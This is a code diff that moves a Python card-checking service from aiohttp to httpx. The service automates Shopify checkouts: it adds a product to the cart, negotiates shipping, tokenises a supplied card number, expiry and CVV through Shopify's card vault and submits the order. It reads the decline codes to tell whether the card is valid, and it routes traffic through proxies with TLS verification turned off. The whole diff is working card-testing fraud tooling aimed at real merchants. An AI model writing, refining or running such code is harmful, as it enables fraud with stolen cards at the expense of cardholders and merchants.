@@ -15,6 +15,7 @@ import logging
 from urllib.parse import urlparse, parse_qs, unquote
 
 import aiohttp
+import httpx
 from fastapi import FastAPI
 from pydantic import BaseModel
 
@@ -291,24 +292,23 @@ def _parse_seller(seller):
     return running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, payment_method_id, gateway_name
 
 
-async def _negotiate(session, graphql_url, headers, variables):
+async def _negotiate(client, graphql_url, headers, variables):
     max_retries = 3
     for attempt in range(max_retries):
         try:
-            resp = await session.post(
+            resp = await client.post(
                 graphql_url,
                 json={'query': PROPOSAL_QUERY, 'variables': variables, 'operationName': 'Proposal'},
                 headers=headers,
-                timeout=aiohttp.ClientTimeout(total=12),
+                timeout=httpx.Timeout(12),
             )
-            data = await resp.json(content_type=None)
+            data = resp.json()
             negotiate = data.get('data', {}).get('session', {}).get('negotiate', {})
             if not negotiate or not isinstance(negotiate, dict):
                 continue
             result = negotiate.get('result', {})
             if not result or not isinstance(result, dict):
                 result = negotiate
-            # Handle Throttled status - wait pollAfter before returning
             if result.get('__typename') == 'Throttled':
                 poll_after = result.get('pollAfter', 2) or 2
                 logger.info(f"[THROTTLED] waiting {poll_after}s")
@@ -324,7 +324,7 @@ async def _negotiate(session, graphql_url, headers, variables):
     return {'__typename': 'NegotiationResultFailed'}
 
 
-async def _shopify_check(session, domain, cc, mm, yy, cvv):
+async def _shopify_check(client, domain, cc, mm, yy, cvv):
     domain = domain.replace('https://', '').replace('http://', '').strip('/')
     base_url = f"https://{domain}"
     gw_name = 'Shopify Payments'
@@ -336,12 +336,12 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
     product = None
     for endpoint in [f"{base_url}/collections/all/products.json?limit=10", f"{base_url}/products.json?limit=10"]:
         try:
-            async with session.get(endpoint, headers={'User-Agent': UA, 'Accept': 'application/json', 'Accept-Language': 'en-US,en;q=0.9'}, timeout=aiohttp.ClientTimeout(total=6)) as resp:
-                if resp.status == 200:
-                    data = await resp.json(content_type=None)
-                    product = _parse_products(data)
-                    if product:
-                        break
+            resp = await client.get(endpoint, headers={'User-Agent': UA, 'Accept': 'application/json', 'Accept-Language': 'en-US,en;q=0.9'}, timeout=httpx.Timeout(8))
+            if resp.status_code == 200:
+                data = resp.json()
+                product = _parse_products(data)
+                if product:
+                    break
         except Exception:
             continue
     if not product:
@@ -356,18 +356,18 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
 
     # Add to cart
     try:
-        async with session.post(f"{base_url}/cart/add.js", json={'id': int(variant_id), 'quantity': 1}, headers=headers, timeout=aiohttp.ClientTimeout(total=6)) as resp:
-            if resp.status != 200:
-                return None, "Failed to add to cart", gw_name, None
+        resp = await client.post(f"{base_url}/cart/add.js", json={'id': int(variant_id), 'quantity': 1}, headers=headers, timeout=httpx.Timeout(8))
+        if resp.status_code != 200:
+            return None, "Failed to add to cart", gw_name, None
     except Exception:
         return None, "Failed to add to cart", gw_name, None
 
     # Create checkout
     ch_headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9'}
     try:
-        async with session.post(f"{base_url}/checkout/", headers=ch_headers, allow_redirects=True, timeout=aiohttp.ClientTimeout(total=8)) as resp:
-            checkout_url = str(resp.url)
-            text = await resp.text()
+        resp = await client.post(f"{base_url}/checkout/", headers=ch_headers, follow_redirects=True, timeout=httpx.Timeout(10))
+        checkout_url = str(resp.url)
+        text = resp.text
     except Exception:
         return None, "Failed to create checkout", gw_name, None
 
@@ -435,7 +435,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
             'prefetchShippingRatesStrategy': None, 'supportsSplitShipping': True,
         }
 
-    # Negotiate shipping - try multiple addresses if delivery unavailable
+    # Negotiate shipping
     running_total = '0'
     shipping_amount = '0'
     tax_amount = '0'
@@ -453,10 +453,9 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
 
             result1 = None
             del_type = None
-            # Loop negotiate to resolve PendingTerms -> FilledDeliveryTerms
             for neg_attempt in range(5):
                 step1_vars['queueToken'] = latest_qt[0]
-                result1 = await _negotiate(session, graphql_url, gql_headers, step1_vars)
+                result1 = await _negotiate(client, graphql_url, gql_headers, step1_vars)
                 _update_qt(result1)
                 if not result1 or not isinstance(result1, dict):
                     break
@@ -470,23 +469,14 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
                 running_total, currency, tax_amount, del_type, delivery_strategy, shipping_amount, api_pmi, api_gw = _parse_seller(sp1)
                 if api_pmi and not payment_method_id: payment_method_id = api_pmi
                 if api_gw: gw_name = api_gw
-                # If delivery resolved to FilledDeliveryTerms with a strategy, done
                 if delivery_strategy and del_type == 'FilledDeliveryTerms':
                     break
-                # PendingTerms means we need to re-negotiate with new queueToken
                 await asyncio.sleep(0.5)
 
-            logger.info(f"[PARSE1] addr={addr_block['city']} del_type={del_type} strategy={delivery_strategy} pmi={api_pmi if api_pmi else payment_method_id} gw={gw_name}")
-
             if delivery_strategy:
-                # Found shipping - proceed
                 break
-            # UnavailableTerms or empty strategy - try next address
-            logger.info(f"[ADDR] {addr_block['city']} no shipping, trying next address")
             continue
-        except Exception as e:
-            logger.info(f"[NEGOTIATE] error: {str(e)[:50]}")
-            continue
+        except Exception:
             continue
 
     if not delivery_strategy:
@@ -495,7 +485,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
     step2_vars = _make_vars()
     step2_vars['delivery'] = _build_selected_delivery(delivery_strategy, addr_block, phone)
     step2_vars['payment'] = {'totalAmount': {'any': True}, 'paymentLines': [], 'billingAddress': {'streetAddress': addr_block}}
-    result2 = await _negotiate(session, graphql_url, gql_headers, step2_vars)
+    result2 = await _negotiate(client, graphql_url, gql_headers, step2_vars)
     _update_qt(result2)
     if result2 and isinstance(result2, dict) and result2.get('__typename') == 'NegotiationResultAvailable':
         sp2 = result2.get('sellerProposal')
@@ -509,11 +499,11 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
     token_payload = {"credit_card": {"month": mm, "name": f"{first} {last}", "number": cc, "verification_value": cvv, "year": year_full}, "payment_session_scope": domain}
 
     try:
-        async with session.post('https://deposit.shopifycs.com/sessions', json=token_payload, headers={'Content-Type': 'application/json', 'User-Agent': UA}, timeout=aiohttp.ClientTimeout(total=6)) as resp:
-            vault_data = await resp.json(content_type=None)
-            if 'id' not in vault_data:
-                return None, "Invalid card - vault rejected", gw_name, None
-            payment_token = vault_data['id']
+        resp = await client.post('https://deposit.shopifycs.com/sessions', json=token_payload, headers={'Content-Type': 'application/json', 'User-Agent': UA}, timeout=httpx.Timeout(8))
+        vault_data = resp.json()
+        if 'id' not in vault_data:
+            return None, "Invalid card - vault rejected", gw_name, None
+        payment_token = vault_data['id']
     except Exception:
         return None, "Invalid card - vault failed", gw_name, None
 
@@ -523,7 +513,7 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
         step3_vars = _make_vars()
         step3_vars['delivery'] = _build_selected_delivery(delivery_strategy, addr_block, phone)
         step3_vars['payment'] = payment_input
-        result3 = await _negotiate(session, graphql_url, gql_headers, step3_vars)
+        result3 = await _negotiate(client, graphql_url, gql_headers, step3_vars)
         _update_qt(result3)
         if result3 and isinstance(result3, dict) and result3.get('__typename') == 'NegotiationResultAvailable':
             sp3 = result3.get('sellerProposal')
@@ -555,8 +545,8 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
 
     async def _do_submit():
         try:
-            r = await session.post(graphql_url, json={'query': SUBMIT_QUERY, 'variables': completion_vars, 'operationName': 'SubmitForCompletion'}, headers=gql_headers, timeout=aiohttp.ClientTimeout(total=10))
-            return await r.text()
+            r = await client.post(graphql_url, json={'query': SUBMIT_QUERY, 'variables': completion_vars, 'operationName': 'SubmitForCompletion'}, headers=gql_headers, timeout=httpx.Timeout(12))
+            return r.text
         except Exception:
             return '{"error":"submit_timeout"}'
 
@@ -592,23 +582,14 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
                 except Exception:
                     return None, "Terms Required (retry failed)", gw_name, None
             elif codes:
-                # Classify the rejection codes properly
                 codes_str = ', '.join([c for c in codes if c][:2])
                 codes_lower = codes_str.lower()
-                
-                # Invalid card format
                 if any(k in codes_lower for k in ['number_invalid_format', 'invalid_number', 'credit_card_number']):
                     return None, "Declined - Invalid Card Number", gw_name, None
-                
-                # Payment method unavailable
                 if any(k in codes_lower for k in ['gateway_unavailable', 'payment_method_unavailable']):
                     return None, "Payment method unavailable", gw_name, None
-                
-                # Technical errors
                 if any(k in codes_lower for k in ['invalid_variable', 'validation_custom', 'artifact_dissatisfaction', 'input_validation_error']):
                     return None, f"Gateway Error - {codes_str}", gw_name, None
-                
-                # Other rejection codes — return the actual code
                 return running_total, f"Declined - {codes_str}", gw_name, None
 
         if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
@@ -648,19 +629,19 @@ async def _shopify_check(session, domain, cc, mm, yy, cvv):
 
     for _ in range(5):
         try:
-            async with session.post(graphql_url, json=poll_json, headers=gql_headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                text = await resp.text()
-                if 'ProcessingReceipt' not in text and 'WaitingReceipt' not in text:
-                    break
-                await asyncio.sleep(0.5)
+            resp = await client.post(graphql_url, json=poll_json, headers=gql_headers, timeout=httpx.Timeout(10))
+            text = resp.text
+            if 'ProcessingReceipt' not in text and 'WaitingReceipt' not in text:
+                break
+            await asyncio.sleep(0.5)
         except Exception:
             break
 
     if 'ProcessingReceipt' in text or 'WaitingReceipt' in text:
         await asyncio.sleep(1)
         try:
-            async with session.post(graphql_url, json=poll_json, headers=gql_headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
-                text = await resp.text()
+            resp = await client.post(graphql_url, json=poll_json, headers=gql_headers, timeout=httpx.Timeout(10))
+            text = resp.text
         except Exception:
             pass
         if 'ProcessingReceipt' in text or 'WaitingReceipt' in text:
@@ -800,11 +781,11 @@ async def check_card(cc, mm, yy, cvv, site=None, proxy=None):
     for s in sites:
         logger.info(f"Checking {card_short} on {s} proxy={proxy_url is not None}")
         try:
-            kw = {"timeout": aiohttp.ClientTimeout(total=25), "connector": aiohttp.TCPConnector(ssl=False)}
+            client_kwargs = {"timeout": httpx.Timeout(25), "follow_redirects": True, "verify": False, "headers": {"User-Agent": _get_ua()}}
             if proxy_url:
-                kw["proxy"] = proxy_url
-            async with aiohttp.ClientSession(**kw) as session:
-                result = await asyncio.wait_for(_shopify_check(session, s, cc, mm, yy, cvv), timeout=30)
+                client_kwargs["proxy"] = proxy_url
+            async with httpx.AsyncClient(**client_kwargs) as client:
+                result = await asyncio.wait_for(_shopify_check(client, s, cc, mm, yy, cvv), timeout=30)
                 amount, response, gw_name = result[0], result[1], result[2]
                 extra = result[3] if len(result) > 3 else None
                 elapsed = round(time.time() - start, 2)
